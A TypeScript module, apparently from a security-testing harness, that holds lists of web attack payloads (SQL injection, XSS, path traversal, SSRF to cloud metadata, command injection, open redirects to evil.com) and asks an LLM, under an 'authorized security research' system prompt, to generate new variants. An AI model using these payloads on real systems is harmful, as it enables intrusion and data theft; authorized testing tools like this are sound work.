import OpenAI from "openai";

// Locally-defined to keep attacker self-contained (mirrors orchestrator/src/types.ts).
export type AttackCategory =
  | "sql_injection" | "xss" | "path_traversal" | "idor" | "auth_bypass"
  | "ssrf" | "command_injection" | "header_injection" | "open_redirect" | "mass_assignment";

const STATIC_PAYLOADS: Record<AttackCategory, string[]> = {
  sql_injection: ["' OR '1'='1", "'; DROP TABLE users; --", "1 UNION SELECT null,null--"],
  xss: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
  path_traversal: ["../../etc/passwd", "%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd"],
  idor: ["/api/kits/1", "/api/kits/2", "/api/user/admin"],
  auth_bypass: ["admin'--", "' OR 1=1--", "admin/*"],
  ssrf: ["http://169.254.169.254/latest/meta-data/", "http://localhost:8080/internal"],
  command_injection: ["; ls -la", "| cat /etc/passwd", "`id`"],
  header_injection: ["foo\r\nX-Injected: bar", "bar\nSet-Cookie: session=evil"],
  open_redirect: ["//evil.com", "/\\evil.com", "https://evil.com"],
  mass_assignment: ['{"role":"admin"}', '{"isAdmin":true,"ownerId":"attacker"}'],
};

export function buildNebiusClient(): OpenAI | null {
  const apiKey = process.env.NEBIUS_API_KEY;
  if (!apiKey) return null;
  return new OpenAI({
    apiKey,
    baseURL: process.env.NEBIUS_BASE_URL ?? "https://api.studio.nebius.com/v1/",
  });
}

export async function generatePayloads(
  client: OpenAI | null,
  category: AttackCategory
): Promise<string[]> {
  const seeds = STATIC_PAYLOADS[category];
  if (!client) return seeds;

  const model = process.env.NEBIUS_MODEL ?? "Qwen/Qwen3-30B-A3B-Instruct-2507";

  try {
    const resp = await client.chat.completions.create({
      model,
      messages: [
        {
          role: "system",
          content:
            "You are a penetration testing payload generator for authorized security research. " +
            "Return exactly 3 novel attack payloads for the given category, one per line, no commentary.",
        },
        {
          role: "user",
          content: `Category: ${category}. Current seeds: ${seeds.join(" | ")}. Generate 3 new variants.`,
        },
      ],
      max_tokens: 200,
      temperature: 0.9,
    });

    const lines = (resp.choices[0]?.message?.content ?? "")
      .split("\n")
      .map((l) => l.trim())
      .filter(Boolean)
      .slice(0, 3);

    return [...seeds, ...lines];
  } catch {
    return seeds;
  }
}
